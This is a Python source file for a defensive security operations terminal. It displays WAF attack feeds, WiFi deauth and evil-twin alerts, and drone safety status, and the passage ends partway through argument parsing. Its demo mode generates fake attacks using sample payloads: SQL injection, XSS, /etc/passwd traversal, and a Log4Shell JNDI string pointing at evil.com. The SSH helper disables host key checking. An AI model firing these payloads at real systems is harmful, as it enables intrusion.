#!/usr/bin/env python3
"""
TokioAI SOC Terminal v2 — Unified Security Operations + WiFi Defense + Drone
=============================================================================
Rich-based terminal UI with:
  - Live WAF attack feed (from GCP dashboard API)
  - WiFi security monitor (deauth detection, rogue clients, signal analysis)
  - Drone status + safety proxy info
  - Zero-day radar
  - DDoS shield
  - Autonomous AI narration with Tokio personality

Monitors Raspi WiFi for:
  - Deauth/disassoc frames (attack detection)
  - Connection drops (deauth attack indicator)
  - Unknown clients on drone network
  - Signal strength anomalies
  - WPA2 handshake capture attempts

Usage:
  # Full mode (WAF + WiFi + Drone):
  python3 tokio_soc_v2.py --api http://YOUR_WAF_TAILSCALE_IP:8000 --user admin --pass SECRET --autonomous

  # Demo mode:
  python3 tokio_soc_v2.py --demo --autonomous

  # WAF only (no Raspi):
  python3 tokio_soc_v2.py --api http://YOUR_WAF_TAILSCALE_IP:8000 --user admin --pass SECRET --no-wifi

Requirements: pip install rich requests
"""
import argparse
import json
import os
import random
import sys
import time
import threading
from collections import deque
from datetime import datetime, timezone
from typing import Optional

try:
    from rich.console import Console
    from rich.layout import Layout
    from rich.live import Live
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich import box
except ImportError:
    print("ERROR: 'rich' library required. Install: pip install rich")
    sys.exit(1)

try:
    import requests as req_lib
except ImportError:
    print("ERROR: 'requests' library required. Install: pip install requests")
    sys.exit(1)

# --- Config ---
API_BASE = os.getenv("TOKIO_DASHBOARD_API", "http://YOUR_WAF_TAILSCALE_IP:8000")
API_USER = os.getenv("TOKIO_DASHBOARD_USER", "admin")
API_PASS = os.getenv("TOKIO_DASHBOARD_PASS", "REDACTED_USE_ENV_VAR")
RASPI_IP = os.getenv("TOKIO_RASPI_IP", "YOUR_RASPI_TAILSCALE_IP")
DRONE_PROXY_URL = os.getenv("DRONE_PROXY_URL", f"http://{RASPI_IP}:5001")
RASPI_API_URL = os.getenv("RASPI_API_URL", f"http://{RASPI_IP}:5000")
REFRESH_INTERVAL = float(os.getenv("TOKIO_CLI_REFRESH", "3.0"))

console = Console()

# --- Colors ---
SEVERITY_COLORS = {
    "critical": "bold red",
    "high": "red",
    "medium": "yellow",
    "low": "cyan",
    "info": "dim white",
}
SEVERITY_ICONS = {
    "critical": "[!!!]",
    "high": "[!! ]",
    "medium": "[ ! ]",
    "low": "[ i ]",
    "info": "[ . ]",
}
THREAT_ICONS = {
    "SQLI": "SQL", "XSS": "XSS", "CMD_INJECTION": "CMD",
    "PATH_TRAVERSAL": "PTH", "LOG4SHELL": "L4S", "SCAN_PROBE": "SCN",
    "BRUTE_FORCE": "BRF", "SSRF": "SSR", "XXE": "XXE",
    "ZERO_DAY_OBFUSCATED": "0DY", "RATE_LIMIT": "RLM", "HONEYPOT": "HPT",
    "DISTRIBUTED_FLOOD": "DDS", "VOLUMETRIC_FLOOD": "VOL",
    "SLOWLORIS": "SLW", "DESERIALIZATION": "DSR", "SSTI": "SST",
    "WIFI_DEAUTH": "DAT", "WIFI_ROGUE": "ROG", "WIFI_SCAN": "WSC",
    "WIFI_HANDSHAKE": "WHS", "WIFI_JAMMING": "JAM",
}

WIFI_SEVERITY_MAP = {
    "WIFI_DEAUTH": "critical",
    "WIFI_ROGUE": "high",
    "WIFI_HANDSHAKE": "critical",
    "WIFI_JAMMING": "critical",
    "WIFI_SCAN": "medium",
}


# ===========================================================================
# Dashboard API Client
# ===========================================================================
class DashboardClient:
    def __init__(self, base_url: str, username: str, password: str):
        self.base = base_url.rstrip("/")
        self.token = None
        self.username = username
        self.password = password
        self._login()

    def _login(self):
        try:
            r = req_lib.post(
                f"{self.base}/api/auth/login",
                json={"username": self.username, "password": self.password},
                timeout=10)
            if r.status_code == 200:
                data = r.json()
                self.token = data.get("token") or data.get("access_token")
        except Exception:
            self.token = None

    def _headers(self):
        h = {"Content-Type": "application/json"}
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
        return h

    def _get(self, path, params=None):
        try:
            r = req_lib.get(f"{self.base}{path}", headers=self._headers(),
                           params=params, timeout=10)
            if r.status_code == 401:
                self._login()
                r = req_lib.get(f"{self.base}{path}", headers=self._headers(),
                               params=params, timeout=10)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return {}

    def _get_list(self, path, params=None, key="data"):
        data = self._get(path, params)
        if isinstance(data, list):
            return data
        return data.get(key, [])

    def get_stats(self):
        raw = self._get("/api/summary")
        if not raw:
            return {}
        total_threats = raw.get("critical", 0) + raw.get("high", 0) + raw.get("medium", 0)
        return {
            "total_requests": raw.get("total", 0),
            "total_threats": total_threats,
            "total_blocks": raw.get("blocked", 0),
            "unique_ips": raw.get("unique_ips", 0),
            "blocks_24h": raw.get("active_blocks", 0),
            "critical": raw.get("critical", 0),
            "high": raw.get("high", 0),
            "medium": raw.get("medium", 0),
            "low": raw.get("low", 0),
        }

    def get_recent_attacks(self, limit=20):
        return self._get_list("/api/attacks/recent", {"limit": limit}, "logs")

    def get_blocked_ips(self):
        return self._get_list("/api/blocked", key="blocked_ips")

    def is_connected(self):
        return self.token is not None


# ===========================================================================
# WiFi Security Monitor — polls Raspi via SSH/API for WiFi events
# ===========================================================================
class WiFiSecurityMonitor:
    """
    Monitors WiFi security on the Raspi. Detects:
    - Deauth attacks (connection drops pattern)
    - Rogue clients on drone network
    - Signal strength anomalies
    - Connection state changes
    """

    def __init__(self, raspi_ip: str, ssh_key: str = None):
        self.raspi_ip = raspi_ip
        self.ssh_key = ssh_key or os.path.expanduser("~/.ssh/id_rsa_raspberry")
        self._events: deque = deque(maxlen=100)
        self._alerts: deque = deque(maxlen=50)
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()

        # State tracking
        self._drone_wifi_connected = False
        self._drone_signal = 0
        self._connection_drops = deque(maxlen=20)  # timestamps of drops
        self._known_clients = set()
        self._last_scan_results = []
        self._deauth_alert_active = False
        self._safe_to_fly = True
        self._fly_risk_reason = ""
        self._stats = {
            "scans": 0,
            "deauth_detected": 0,
            "rogue_clients": 0,
            "drops": 0,
            "signal_avg": 0,
        }
        self._signal_history = deque(maxlen=30)

    def start(self):
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False

    def _ssh_cmd(self, cmd: str, timeout: int = 8) -> Optional[str]:
        """Execute command on Raspi via SSH."""
        import subprocess
        full_cmd = [
            "ssh", "-i", self.ssh_key,
            "-o", "ConnectTimeout=5",
            "-o", "StrictHostKeyChecking=no",
            "-o", "BatchMode=yes",
            f"mrmoz@{self.raspi_ip}",
            cmd
        ]
        try:
            r = subprocess.run(full_cmd, capture_output=True, text=True,
                              timeout=timeout)
            if r.returncode == 0:
                return r.stdout.strip()
            return None
        except Exception:
            return None

    def _monitor_loop(self):
        """Background monitoring loop."""
        time.sleep(2)
        while self._running:
            try:
                self._check_wifi_state()
                self._check_drone_connection()
                self._check_nearby_networks()
                self._check_deauth_pattern()
                self._stats["scans"] += 1
            except Exception as e:
                self._add_event("error", f"Monitor error: {e}")
            time.sleep(5)

    def _check_wifi_state(self):
        """Check current WiFi connection and signal."""
        result = self._ssh_cmd(
            "nmcli -t -f NAME,TYPE,DEVICE connection show --active 2>/dev/null; "
            "echo '---'; "
            "iwconfig wlan0 2>/dev/null | grep -i 'signal\\|link\\|essid'"
        )
        if not result:
            return

        parts = result.split("---")
        connections = parts[0].strip() if parts else ""
        iwconfig = parts[1].strip() if len(parts) > 1 else ""

        # Check if connected to drone
        was_connected = self._drone_wifi_connected
        self._drone_wifi_connected = "tello-drone" in connections or "T0K10" in connections

        # Parse signal
        if "Signal level" in iwconfig:
            try:
                sig_str = iwconfig.split("Signal level=")[1].split(" ")[0]
                self._drone_signal = int(sig_str)
                self._signal_history.append(self._drone_signal)
                if len(self._signal_history) >= 5:
                    self._stats["signal_avg"] = sum(self._signal_history) // len(self._signal_history)
            except (ValueError, IndexError):
                pass

        # Detect drop
        if was_connected and not self._drone_wifi_connected:
            now = time.time()
            self._connection_drops.append(now)
            self._stats["drops"] += 1
            self._add_event("drop", "Drone WiFi connection LOST")
            self._add_alert("WIFI_DEAUTH", "Conexion WiFi con drone perdida — posible deauth attack")

        elif not was_connected and self._drone_wifi_connected:
            self._add_event("connect", f"Drone WiFi connected (signal: {self._drone_signal}dBm)")

    def _check_drone_connection(self):
        """Check drone proxy status."""
        try:
            r = req_lib.get(f"{DRONE_PROXY_URL}/drone/status", timeout=5)
            if r.status_code == 200:
                data = r.json()
                if data.get("connected"):
                    self._add_event("drone", f"Drone connected — armed={data.get('armed')}")
        except Exception:
            pass

    def _check_nearby_networks(self):
        """Scan for suspicious nearby WiFi activity."""
        result = self._ssh_cmd(
            "sudo iw dev wlan0 scan 2>/dev/null | grep -E 'BSS |SSID:|signal:' | head -60",
            timeout=15
        )
        if not result:
            return

        lines = result.split("\n")
        networks = []
        current = {}
        for line in lines:
            line = line.strip()
            if line.startswith("BSS "):
                if current:
                    networks.append(current)
                bssid = line.split("(")[0].replace("BSS ", "").strip()
                current = {"bssid": bssid, "ssid": "", "signal": 0}
            elif "SSID:" in line:
                current["ssid"] = line.split("SSID:")[1].strip()
            elif "signal:" in line:
                try:
                    current["signal"] = float(line.split("signal:")[1].split(" ")[1])
                except (ValueError, IndexError):
                    pass
        if current:
            networks.append(current)

        self._last_scan_results = networks

        # Check for suspicious networks mimicking drone SSID
        for net in networks:
            ssid = net.get("ssid", "")
            if ssid and ssid != "T0K10-NET" and ("TELLO" in ssid.upper() or "T0K10" in ssid.upper()):
                self._stats["rogue_clients"] += 1
                self._add_alert("WIFI_ROGUE",
                    f"Red WiFi sospechosa detectada: '{ssid}' (signal: {net.get('signal')}dBm) — posible evil twin")

    def _check_deauth_pattern(self):
        """Analyze connection drops for deauth attack pattern."""
        now = time.time()
        recent_drops = [t for t in self._connection_drops if now - t < 60]

        if len(recent_drops) >= 3:
            # 3+ drops in 60 seconds = deauth attack
            if not self._deauth_alert_active:
                self._deauth_alert_active = True
                self._safe_to_fly = False
                self._fly_risk_reason = f"DEAUTH ATTACK: {len(recent_drops)} desconexiones en 60s"
                self._stats["deauth_detected"] += 1
                self._add_alert("WIFI_DEAUTH",
                    f"ATAQUE DEAUTH CONFIRMADO — {len(recent_drops)} drops en 60s. "
                    f"NO ES SEGURO VOLAR. Atacante intentando desconectar el drone.")
        elif len(recent_drops) == 0 and self._deauth_alert_active:
            self._deauth_alert_active = False
            self._safe_to_fly = True
            self._fly_risk_reason = ""
            self._add_event("clear", "Deauth attack stopped — WiFi stable again")

        # Signal anomaly detection
        if len(self._signal_history) >= 10:
            recent_signals = list(self._signal_history)[-10:]
            avg = sum(recent_signals) / len(recent_signals)
            variance = sum((s - avg) ** 2 for s in recent_signals) / len(recent_signals)
            if variance > 100:  # High variance = possible jamming
                self._add_alert("WIFI_JAMMING",
                    f"Anomalia de senal WiFi detectada — varianza: {variance:.0f}, "
                    f"posible jamming en 2.4GHz")

    def _add_event(self, event_type: str, message: str):
        with self._lock:
            self._events.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "type": event_type,
                "message": message,
            })

    def _add_alert(self, threat_type: str, message: str):
        with self._lock:
            self._alerts.append({
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "time": datetime.now().strftime("%H:%M:%S"),
                "threat_type": threat_type,
                "severity": WIFI_SEVERITY_MAP.get(threat_type, "medium"),
                "message": message,
                "ip": "local/wifi",
                "uri": "WiFi 2.4GHz",
                "confidence": 0.95,
                "action": "alert",
            })

    def get_events(self, limit=20):
        with self._lock:
            return list(self._events)[-limit:]

    def get_alerts(self, limit=10):
        with self._lock:
            return list(self._alerts)[-limit:]

    def get_status(self):
        with self._lock:
            return {
                "drone_wifi": self._drone_wifi_connected,
                "signal": self._drone_signal,
                "signal_avg": self._stats["signal_avg"],
                "safe_to_fly": self._safe_to_fly,
                "risk_reason": self._fly_risk_reason,
                "deauth_active": self._deauth_alert_active,
                "nearby_networks": len(self._last_scan_results),
                "stats": dict(self._stats),
            }


# ===========================================================================
# Drone Status Monitor
# ===========================================================================
class DroneMonitor:
    """Polls drone safety proxy for status."""

    def __init__(self):
        self._status = {}
        self._connected = False
        self._armed = False
        self._battery = -1
        self._lock = threading.Lock()
        self._running = False

    def start(self):
        self._running = True
        threading.Thread(target=self._poll_loop, daemon=True).start()

    def stop(self):
        self._running = False

    def _poll_loop(self):
        while self._running:
            try:
                r = req_lib.get(f"{DRONE_PROXY_URL}/drone/status", timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    with self._lock:
                        self._status = data
                        self._connected = data.get("connected", False)
                        self._armed = data.get("armed", False)
            except Exception:
                with self._lock:
                    self._connected = False
            time.sleep(3)

    def get_status(self):
        with self._lock:
            return dict(self._status)

    @property
    def connected(self):
        with self._lock:
            return self._connected

    @property
    def armed(self):
        with self._lock:
            return self._armed


# ===========================================================================
# Demo Client (simulated data)
# ===========================================================================
class DemoClient:
    def __init__(self):
        self._attack_count = 0
        self._block_count = 0
        self._start = time.time()
        self._attacks_log = deque(maxlen=50)
        self._blocked = []
        self._countries = ["CN", "RU", "US", "BR", "IR", "KR", "DE", "IN", "VN", "UA"]
        self._last_gen = 0

    def _maybe_generate(self):
        now = time.time()
        if now - self._last_gen < 2:
            return
        self._last_gen = now
        for _ in range(random.randint(1, 3)):
            self._attack_count += 1
            threat = random.choice([
                "SQLI", "XSS", "CMD_INJECTION", "SCAN_PROBE", "BRUTE_FORCE",
                "PATH_TRAVERSAL", "LOG4SHELL", "ZERO_DAY_OBFUSCATED", "SSRF",
                "HONEYPOT", "DESERIALIZATION",
            ])
            sev = random.choice(["critical", "high", "medium"])
            ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            attack = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "ip": ip, "method": random.choice(["GET", "POST"]),
                "uri": random.choice([
                    "/' OR 1=1--", "/wp-login.php", "/<script>alert(1)</script>",
                    "/etc/passwd", "/${jndi:ldap://evil.com}", "/admin/.env",
                ]),
                "severity": sev, "threat_type": threat,
                "confidence": round(random.uniform(0.75, 0.99), 2),
                "action": "block_ip" if sev in ("critical", "high") else "monitor",
                "country": random.choice(self._countries),
            }
            if threat == "ZERO_DAY_OBFUSCATED":
                attack["entropy"] = round(random.uniform(4.5, 6.2), 2)
                attack["encoding_layers"] = random.randint(2, 5)
            self._attacks_log.append(attack)
            if sev == "critical" and random.random() > 0.3:
                self._block_count += 1
                self._blocked.append({
                    "ip": ip, "reason": f"Auto-block: {threat}",
                    "threat_type": threat, "severity": sev,
                    "blocked_at": datetime.now(timezone.utc).isoformat(),
                    "block_type": "instant",
                })
                if len(self._blocked) > 30:
                    self._blocked.pop(0)

    def is_connected(self):
        return True

    def get_stats(self):
        self._maybe_generate()
        return {
            "total_requests": self._attack_count * 15 + random.randint(100, 500),
            "total_threats": self._attack_count,
            "total_blocks": self._block_count,
            "unique_ips": len(set(a["ip"] for a in self._attacks_log)),
            "blocks_24h": self._block_count,
            "critical": random.randint(5, 20),
            "high": random.randint(10, 40),
            "medium": random.randint(20, 60),
            "low": random.randint(30, 100),
        }

    def get_recent_attacks(self, limit=20):
        self._maybe_generate()
        return list(self._attacks_log)[-limit:]

    def get_blocked_ips(self):
        return self._blocked[-15:]


# ===========================================================================
# Autonomous Narrator (with WiFi + drone awareness)
# ===========================================================================
class AutonomousNarrator:
    def __init__(self):
        self.narrations: deque = deque(maxlen=30)
        self._seen_ips = set()
        self._count = 0
        self._attack_trend = deque(maxlen=10)

    def analyze(self, stats, attacks, blocked,
                wifi_status=None, wifi_alerts=None, drone_status=None):
        now = datetime.now().strftime("%H:%M:%S")
        self._count += 1

        threat_count = stats.get("total_threats", 0)
        self._attack_trend.append(threat_count)

        # --- WiFi alerts (highest priority) ---
        if wifi_alerts:
            for alert in wifi_alerts[-3:]:
                threat = alert.get("threat_type", "")
                if threat == "WIFI_DEAUTH":
                    self._add(now, "critical",
                        "ALERTA MAXIMA: Ataque de deautenticacion WiFi detectado. "
                        "Alguien esta intentando desconectar el drone de la red. "
                        "Vuelo NO AUTORIZADO hasta que el ataque cese. "
                        "Protocolo de defensa activado.")
                elif threat == "WIFI_ROGUE":
                    self._add(now, "high",
                        f"Red WiFi sospechosa detectada — posible Evil Twin. "
                        f"Alguien intenta suplantar la red del drone. "
                        f"Manteniendo conexion cifrada WPA2.")
                elif threat == "WIFI_JAMMING":
                    self._add(now, "critical",
                        "Interferencia de senal detectada en 2.4GHz. "
                        "Posible jamming activo. Modo defensivo activado.")

        # --- WiFi status ---
        if wifi_status and self._count % 8 == 0:
            safe = wifi_status.get("safe_to_fly", True)
            signal = wifi_status.get("signal", 0)
            nearby = wifi_status.get("nearby_networks", 0)
            drops = wifi_status.get("stats", {}).get("drops", 0)

            if not safe:
                reason = wifi_status.get("risk_reason", "unknown")
                self._add(now, "critical",
                    f"VUELO BLOQUEADO — {reason}. "
                    f"Esperando estabilidad de la red WiFi.")
            else:
                self._add(now, "info",
                    f"WiFi seguro. Signal: {signal}dBm, "
                    f"{nearby} redes cercanas, {drops} drops totales. "
                    f"Canal 2.4GHz monitoreado. Vuelo autorizado.")

        # --- Drone status ---
        if drone_status and self._count % 10 == 0:
            connected = drone_status.get("connected", False)
            armed = drone_status.get("armed", False)
            kill = drone_status.get("kill_switch", False)
            audit = drone_status.get("audit", {})

            if kill:
                self._add(now, "critical",
                    "KILL SWITCH ACTIVO — Todos los motores detenidos. "
                    "Protocolo de emergencia activado.")
            elif armed:
                self._add(now, "high",
                    f"Drone EN VUELO. Safety proxy activo, "
                    f"geofence monitoreando posicion. "
                    f"{audit.get('total_commands', 0)} comandos procesados, "
                    f"{audit.get('blocked_commands', 0)} bloqueados.")
            elif connected:
                self._add(now, "info",
                    f"Drone conectado y en standby. Listo para volar.")

        # --- WAF attacks analysis ---
        for atk in attacks[-5:]:
            ip = atk.get("ip", "")
            threat = atk.get("threat_type", "")
            sev = atk.get("severity", "")

            if ip and ip not in self._seen_ips:
                self._seen_ips.add(ip)
                country = atk.get("country", "??")
                if sev == "critical":
                    self._add(now, "critical",
                        f"Nueva IP atacante: {ip} ({country}) — {threat} "
                        f"con confianza {float(atk.get('confidence', 0) or 0):.0%}. "
                        f"Bloqueada automaticamente.")

            if threat == "ZERO_DAY_OBFUSCATED":
                entropy = atk.get("entropy", 0)
                layers = atk.get("encoding_layers", 0)
                self._add(now, "critical",
                    f"ZERO-DAY detectado — Payload con entropia {entropy:.2f}, "
                    f"{layers} capas de encoding. Bloqueado por analisis de entropia.")

        # --- Trend ---
        if len(self._attack_trend) >= 5 and self._count % 7 == 0:
            recent = list(self._attack_trend)
            if len(recent) >= 3:
                diff = recent[-1] - recent[-3]
                if diff > 10:
                    self._add(now, "high",
                        f"Tendencia al alza: +{diff} amenazas en ultimos ciclos. "
                        f"Posible ataque coordinado.")

        # --- Periodic ---
        if self._count % 12 == 0:
            blocks = stats.get("total_blocks", stats.get("blocks_24h", 0))
            threats = stats.get("total_threats", 0)
            self._add(now, "info",
                f"Status operacional: {threats} amenazas detectadas, "
                f"{blocks} bloqueadas. Todos los sistemas nominales.")

    def _add(self, timestamp, severity, text):
        # Avoid duplicates
        if self.narrations and self.narrations[-1]["text"] == text:
            return
        self.narrations.append({
            "time": timestamp, "severity": severity, "text": text,
        })

    def get_narrations(self, limit=15):
        return list(self.narrations)[-limit:]


# ===========================================================================
# UI Panels
# ===========================================================================

def build_header(connected, autonomous, wifi_safe=True, drone_connected=False):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mode = "AUTONOMOUS" if autonomous else "MONITORING"
    conn = "[green]WAF OK[/]" if connected else "[red]WAF OFF[/]"
    wifi = "[green]WiFi OK[/]" if wifi_safe else "[bold red]WiFi ATTACK[/]"
    drone = "[green]DRONE[/]" if drone_connected else "[dim]NO DRONE[/]"

    t = Text()
    t.append("  TOKIOAI", style="bold cyan")
    t.append(" SOC TERMINAL", style="bold white")
    t.append(" v2.0", style="dim")
    t.append(f"  {conn}  {wifi}  {drone}  {mode}  {now}", style="dim white")
    return Panel(t, style="cyan", box=box.DOUBLE)


def build_attacks_panel(attacks, wifi_alerts=None):
    """Combined WAF + WiFi attacks panel."""
    table = Table(box=box.SIMPLE_HEAD, show_header=True, expand=True,
                  header_style="bold cyan", pad_edge=False)
    table.add_column("Time", width=8, style="dim")
    table.add_column("Sev", width=5)
    table.add_column("Type", width=4)
    table.add_column("Source", width=15)
    table.add_column("Detail", ratio=1)
    table.add_column("Conf", width=5, justify="right")
    table.add_column("Act", width=5)

    # Merge WAF attacks and WiFi alerts
    all_attacks = list(attacks[-12:])
    if wifi_alerts:
        for wa in wifi_alerts[-5:]:
            all_attacks.append({
                "timestamp": wa.get("timestamp", ""),
                "severity": wa.get("severity", "medium"),
                "threat_type": wa.get("threat_type", "WIFI"),
                "ip": "WiFi/2.4G",
                "uri": wa.get("message", "")[:50],
                "confidence": wa.get("confidence", 0.9),
                "action": "alert",
            })

    # Sort by timestamp
    all_attacks.sort(key=lambda x: x.get("timestamp", ""), reverse=False)

    for atk in all_attacks[-15:]:
        ts = atk.get("timestamp", "")
        if isinstance(ts, str) and "T" in ts:
            ts = ts.split("T")[1][:8]
        elif isinstance(ts, str) and " " in ts:
            ts = ts.split(" ")[1][:8]

        sev = atk.get("severity", "info")
        color = SEVERITY_COLORS.get(sev, "white")
        icon = SEVERITY_ICONS.get(sev, "[ ]")
        threat = THREAT_ICONS.get(atk.get("threat_type", ""), "???")
        conf = atk.get("confidence")
        try:
            conf_str = f"{float(conf):.0%}" if conf else "--"
        except (ValueError, TypeError):
            conf_str = "--"
        action = atk.get("action", "log")
        act_str = "BLK" if action == "block_ip" else ("ALR" if action == "alert" else "MON")
        act_color = "red" if action == "block_ip" else ("magenta" if action == "alert" else "yellow")

        detail = atk.get("uri", "")
        if len(detail) > 45:
            detail = detail[:42] + "..."

        table.add_row(
            ts, Text(icon, style=color), Text(threat, style=color),
            atk.get("ip", "?"), detail,
            Text(conf_str, style=color), Text(act_str, style=act_color),
        )

    return Panel(table, title="[bold red] LIVE THREATS — WAF + WiFi [/]",
                 border_style="red", box=box.ROUNDED)


def build_wifi_panel(wifi_status, wifi_events):
    """WiFi security status panel."""
    if not wifi_status:
        return Panel("[dim]WiFi monitor not active[/]",
                     title="[bold yellow] WiFi DEFENSE [/]",
                     border_style="yellow", box=box.ROUNDED)

    safe = wifi_status.get("safe_to_fly", True)
    signal = wifi_status.get("signal", 0)
    nearby = wifi_status.get("nearby_networks", 0)
    deauth = wifi_status.get("deauth_active", False)
    stats = wifi_status.get("stats", {})
    drone_wifi = wifi_status.get("drone_wifi", False)

    lines = []

    # Fly status
    if safe:
        lines.append(Text("  VUELO: AUTORIZADO", style="bold green"))
    else:
        reason = wifi_status.get("risk_reason", "")
        lines.append(Text(f"  VUELO: BLOQUEADO", style="bold red"))
        lines.append(Text(f"  Razon: {reason}", style="red"))

    lines.append(Text(""))

    # Connection
    if drone_wifi:
        # Signal bar
        sig_pct = min(1.0, max(0, (signal + 90) / 60))  # -90 to -30 range
        bar_len = int(sig_pct * 15)
        bar = "|" * bar_len + "." * (15 - bar_len)
        sig_color = "green" if sig_pct > 0.5 else ("yellow" if sig_pct > 0.25 else "red")
        lines.append(Text(f"  Drone WiFi: CONNECTED", style="green"))
        lines.append(Text(f"  Signal: [{bar}] {signal}dBm", style=sig_color))
    else:
        lines.append(Text(f"  Drone WiFi: DISCONNECTED", style="red"))

    lines.append(Text(f"  Redes cercanas: {nearby}", style="dim"))
    lines.append(Text(f"  Drops: {stats.get('drops', 0)} | Deauth: {stats.get('deauth_detected', 0)}", style="dim"))

    if deauth:
        lines.append(Text(""))
        lines.append(Text("  *** DEAUTH ATTACK ACTIVE ***", style="bold red blink"))

    # Recent events
    if wifi_events:
        lines.append(Text(""))
        for ev in wifi_events[-3:]:
            ev_color = "red" if ev["type"] in ("drop", "error") else ("green" if ev["type"] == "connect" else "dim")
            lines.append(Text(f"  [{ev['time']}] {ev['message']}", style=ev_color))

    content = Text("\n")
    for line in lines:
        content.append_text(line)
        content.append("\n")

    border = "red" if not safe or deauth else ("yellow" if not drone_wifi else "green")
    return Panel(content, title="[bold yellow] WiFi DEFENSE [/]",
                 border_style=border, box=box.ROUNDED)


def build_drone_panel(drone_status):
    """Drone safety proxy status panel."""
    if not drone_status or not drone_status.get("connected"):
        t = int(time.time()) % 4
        dots = "." * (t + 1) + " " * (3 - t)
        return Panel(
            f"[dim]  Buscando drone{dots}\n  Proxy: activo\n  Puerto: 5001[/]",
            title="[bold blue] DRONE [/]",
            border_style="dim blue", box=box.ROUNDED)

    armed = drone_status.get("armed", False)
    kill = drone_status.get("kill_switch", False)
    pos = drone_status.get("position", {})
    geo = drone_status.get("geofence", {})
    audit = drone_status.get("audit", {})
    safety = drone_status.get("safety_level", "demo")

    lines = []
    if kill:
        lines.append(Text("  STATUS: KILL SWITCH ACTIVE", style="bold red blink"))
    elif armed:
        lines.append(Text("  STATUS: EN VUELO", style="bold green"))
    else:
        lines.append(Text("  STATUS: STANDBY", style="cyan"))

    lines.append(Text(f"  Safety: {safety.upper()}", style="cyan"))
    lines.append(Text(f"  Pos: X={pos.get('x',0)} Y={pos.get('y',0)} Z={pos.get('z',0)}cm", style="dim"))
    lines.append(Text(f"  Geofence: {geo.get('max_distance_cm', 0)}cm rad, {geo.get('max_height_cm', 0)}cm alt", style="dim"))
    lines.append(Text(f"  Commands: {audit.get('total_commands', 0)} ({audit.get('blocked_commands', 0)} blocked)", style="dim"))

    content = Text("\n")
    for line in lines:
        content.append_text(line)
        content.append("\n")

    border = "red" if kill else ("green" if armed else "blue")
    return Panel(content, title="[bold blue] DRONE [/]",
                 border_style=border, box=box.ROUNDED)


def build_stats_panel(stats):
    total = stats.get("total_requests", 0)
    threats = stats.get("total_threats", 0)
    blocks = stats.get("total_blocks", stats.get("blocks_24h", 0))
    crit = stats.get("critical", 0)
    high = stats.get("high", 0)
    med = stats.get("medium", 0)

    content = (
        f"  Requests:  {total:,}\n"
        f"  Threats:   {threats:,}\n"
        f"  Blocked:   {blocks:,}\n"
        f"  ---\n"
        f"  [red]Critical: {crit}[/]  [yellow]High: {high}[/]  [cyan]Med: {med}[/]"
    )
    return Panel(content, title="[bold green] WAF STATS [/]",
                 border_style="green", box=box.ROUNDED)


def build_blocked_panel(blocked):
    table = Table(box=None, show_header=True, expand=True,
                  header_style="bold red", pad_edge=False)
    table.add_column("IP", width=15)
    table.add_column("Reason", ratio=1)

    for b in blocked[-8:]:
        reason = b.get("reason", "")
        if len(reason) > 35:
            reason = reason[:32] + "..."
        table.add_row(b.get("ip", "?"), reason)

    return Panel(table, title="[bold red] BLOCKED IPs [/]",
                 border_style="red", box=box.ROUNDED)


def build_narrator_panel(narrations):
    content = Text()
    if not narrations:
        content.append("  Tokio AI initializing...\n", style="dim cyan")
        content.append("  Analyzing traffic patterns...\n", style="dim")
        content.append("  Monitoring WiFi security...\n", style="dim")
    else:
        for n in narrations[-6:]:
            sev = n.get("severity", "info")
            color = SEVERITY_COLORS.get(sev, "white")
            content.append(f"  [{n['time']}] ", style="dim")
            content.append(f"{n['text']}\n\n", style=color)

    return Panel(content, title="[bold cyan] TOKIO AI — AUTONOMOUS DEFENSE [/]",
                 border_style="cyan", box=box.DOUBLE)


# ===========================================================================
# Main Layout
# ===========================================================================

def build_layout(client, narrator, autonomous,
                 wifi_monitor=None, drone_monitor=None):
    # Fetch data
    stats = client.get_stats()
    attacks = client.get_recent_attacks(20)
    blocked = client.get_blocked_ips()

    wifi_status = wifi_monitor.get_status() if wifi_monitor else None
    wifi_events = wifi_monitor.get_events(5) if wifi_monitor else []
    wifi_alerts = wifi_monitor.get_alerts(10) if wifi_monitor else []
    drone_status = drone_monitor.get_status() if drone_monitor else {}

    if autonomous:
        narrator.analyze(stats, attacks, blocked,
                        wifi_status, wifi_alerts, drone_status)

    layout = Layout()
    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="body"),
        Layout(name="narrator", size=12) if autonomous else Layout(name="spacer", size=1),
    )

    layout["body"].split_row(
        Layout(name="left", ratio=3),
        Layout(name="right", ratio=2),
    )

    layout["right"].split_column(
        Layout(name="wifi", ratio=3),
        Layout(name="drone", ratio=2),
        Layout(name="stats", ratio=2),
        Layout(name="blocked", ratio=2),
    )

    # Populate
    wifi_safe = wifi_status.get("safe_to_fly", True) if wifi_status else True
    drone_conn = drone_monitor.connected if drone_monitor else False

    layout["header"].update(build_header(client.is_connected(), autonomous,
                                          wifi_safe, drone_conn))
    layout["left"].update(build_attacks_panel(attacks, wifi_alerts))
    layout["wifi"].update(build_wifi_panel(wifi_status, wifi_events))
    layout["drone"].update(build_drone_panel(drone_status))
    layout["stats"].update(build_stats_panel(stats))
    layout["blocked"].update(build_blocked_panel(blocked))

    if autonomous:
        layout["narrator"].update(
            build_narrator_panel(narrator.get_narrations()))

    return layout


# ===========================================================================
# Main
# ===========================================================================

def main():
    parser = argparse.ArgumentParser(
        description="TokioAI SOC Terminal v2 — WAF + WiFi Defense + Drone")
    parser.add_argument("--api", default=API_BASE, help="Dashboard API URL")
    parser.add_argument("--user", default=API_USER, help="Dashboard username")
    parser.add_argument("--password", "--pass", default=API_PASS, dest="password",
                        help="Dashboard password")
    parser.add_argument("--autonomous", "-a", action="store_true",
                        help="Enable autonomous AI narration")
    parser.add_argument("--demo", action="store_true",
                        help="Demo mode with simulated data")
    parser.add_argument("--no-wifi", action="store_true",
                        help="Disable WiFi monitoring")
    parser.add_argument("--no-drone", action="store_true",
                        help="Disable drone monitoring")
